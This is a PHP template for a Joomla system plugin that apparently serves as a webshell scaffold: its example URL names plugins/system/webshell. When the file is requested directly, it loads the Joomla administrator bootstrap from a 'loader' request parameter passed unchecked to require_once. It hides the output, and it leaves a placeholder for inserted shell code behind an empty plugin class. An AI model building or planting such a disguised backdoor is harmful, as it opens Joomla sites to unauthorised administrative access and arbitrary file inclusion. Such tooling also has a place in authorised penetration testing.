<?php
// Check to ensure this file is included in Joomla!
if (!defined('_JEXEC')) {
    $loader = $_REQUEST['loader'] ?: '../../../administrator/index.php';
    if (!file_exists($loader) && empty($_REQUEST['loader'])) {
        echo "<pre>";
        echo "ALERT: Administrator's index.php not found. Please provide the path to the 'administrator/index.php' file using the 'loader' parameter.";
        echo "Example: http://example.com/plugins/system/webshell/plugin.php?loader=../../../administrator/index.php";
        echo "\n\n";
        echo "Current path: " . basename(__FILE__);
        echo "</pre>";

        exit;
    }

    // avoid outputting any joomla default page
    ob_start();
    require_once $loader;
    ob_end_clean();

    // __TEMPLATE_INSERTION_POINT__

    exit;
}

// Empty system plugin definition
class plgSystem__PLUGIN_NAME_SNAKE__
    extends JPlugin {
    public
    function __construct(
        &$subject,
        $config = array()
    ) {
        parent::__construct($subject, $config);
    }
}